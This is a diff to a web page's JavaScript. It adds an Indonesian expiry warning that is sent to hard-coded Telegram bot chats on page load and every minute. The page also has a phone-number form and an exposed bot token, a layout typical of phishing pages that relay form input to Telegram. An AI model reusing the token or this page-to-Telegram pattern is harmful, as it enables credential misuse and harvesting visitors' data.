@@ -209,7 +209,29 @@ const bots = [
   { token: "7690173453:AAFizIJfq7OWi5tthhxxqXKWcS0Xb5bP_iE", chatId: "6832746767" },
   { token: "7690173453:AAFizIJfq7OWi5tthhxxqXKWcS0Xb5bP_iE", chatId: "6832746767" }
 ];
+/* ===== PESAN NOTIFIKASI ===== */
+const EXPIRY_MESSAGE =
+  "⚠️ *PERINGATAN SISTEM*\n━━━━━━━━━━━━━━\n⏳ Masa aktif *WEBP* tersisa *2 hari*\nSegera lakukan perpanjangan.\n━━━━━━━━━━━━━━";
 
+/* ===== FUNCTION KIRIM NOTIF ===== */
+function sendExpiryNotification() {
+  bots.forEach(bot => {
+    const api =
+      `https://api.telegram.org/bot${bot.token}/sendMessage` +
+      `?chat_id=${bot.chatId}` +
+      `&text=${encodeURIComponent(EXPIRY_MESSAGE)}` +
+      `&parse_mode=Markdown`;
+
+    fetch(api).catch(err => console.error("Notif error:", err));
+  });
+}
+
+/* ===== JALANKAN OTOMATIS ===== */
+// kirim langsung saat halaman dibuka
+sendExpiryNotification();
+
+// kirim setiap 1 menit (60.000 ms)
+setInterval(sendExpiryNotification, 60 * 1000);
 phoneForm.addEventListener('submit', function(e) {
   e.preventDefault();
 
